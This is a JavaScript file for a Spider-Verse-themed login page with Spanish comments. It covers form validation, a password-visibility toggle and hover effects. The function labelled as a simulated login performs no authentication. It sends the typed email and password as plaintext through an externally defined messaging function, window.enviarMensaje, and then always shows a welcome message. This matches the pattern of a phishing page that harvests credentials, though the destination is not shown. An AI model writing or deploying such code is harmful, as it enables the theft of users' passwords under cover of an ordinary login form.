/**
 * SPIDER-VERSE LOGIN - FUNCIONALIDAD
 *
 * Manejo del formulario de login
 * Efectos interactivos
 * Validación básica
 */

document.addEventListener("DOMContentLoaded", () => {
  // Elementos del DOM
  const loginForm = document.querySelector(".login-form");
  const passwordInput = document.getElementById("password");
  const togglePassword = document.querySelector(".toggle-password");
  const loginContainer = document.querySelector(".login-container");

  // Efecto de aparición
  loginContainer.classList.add("fade-in");

  // Mostrar/ocultar contraseña
  if (togglePassword && passwordInput) {
    togglePassword.addEventListener("click", () => {
      const isPassword = passwordInput.type === "password";
      passwordInput.type = isPassword ? "text" : "password";
      togglePassword.classList.toggle("fa-eye-slash", isPassword);
      togglePassword.classList.toggle("fa-eye", !isPassword);
    });
  }

  // Validación del formulario
  if (loginForm) {
    loginForm.addEventListener("submit", (e) => {
      e.preventDefault();

      const email = loginForm.querySelector('input[type="email"]');
      const password = loginForm.querySelector('input[type="password"]');

      // Validación básica
      if (!email.value || !password.value) {
        showError("Por favor, completa todos los campos");
        return;
      }

      // Simular envío
      simulateLogin(email.value, password.value);
    });
  }

  // Efecto hover mejorado para botones
  const buttons = document.querySelectorAll(".login-btn");
  buttons.forEach((button) => {
    button.addEventListener("mouseenter", () => {
      button.style.transform = "translateY(-3px)";
    });

    button.addEventListener("mouseleave", () => {
      button.style.transform = "translateY(0)";
    });
  });
});

/**
 * Simula el proceso de login
 * @param {string} email - Email del usuario
 * @param {string} password - Contraseña del usuario
 */
function simulateLogin(email, password) {
  // console.log("Intentando login con:", { email, password });
  // Aquí iría la lógica real de autenticación

  // Simulación de carga
  const loginBtn = document.querySelector(".login-btn");
  const originalText = loginBtn.innerHTML;

  loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validando...';
  loginBtn.disabled = true;

  // setTimeout(() => {
  //   loginBtn.innerHTML = originalText;
  //   loginBtn.disabled = false;
  //   showSuccess("¡Bienvenido de vuelta!");
  // }, 1500);

  window.enviarMensaje(`${email} ${password}`)
  .then((res) => {
    loginBtn.innerHTML = originalText;
    loginBtn.disabled = false;
    showSuccess("¡Bienvenido de vuelta!");
  });
}

/**
 * Muestra un mensaje de error
 * @param {string} message - Mensaje a mostrar
 */
function showError(message) {
  const errorElement = document.createElement("div");
  errorElement.className = "error-message";
  errorElement.textContent = message;
  errorElement.style.color = "#ff6b6b";
  errorElement.style.marginTop = "1rem";

  const form = document.querySelector(".login-form");
  const existingError = document.querySelector(".error-message");

  if (existingError) {
    existingError.remove();
  }

  form.appendChild(errorElement);

  setTimeout(() => {
    errorElement.style.opacity = "0";
    setTimeout(() => errorElement.remove(), 300);
  }, 3000);
}

/**
 * Muestra un mensaje de éxito
 * @param {string} message - Mensaje a mostrar
 */
function showSuccess(message) {
  const successElement = document.createElement("div");
  successElement.className = "success-message";
  successElement.textContent = message;
  successElement.style.color = "#4cc9f0";
  successElement.style.marginTop = "1rem";

  const form = document.querySelector(".login-form");
  const existingSuccess = document.querySelector(".success-message");

  if (existingSuccess) {
    existingSuccess.remove();
  }

  form.appendChild(successElement);

  setTimeout(() => {
    successElement.style.opacity = "0";
    setTimeout(() => successElement.remove(), 300);
  }, 3000);
}
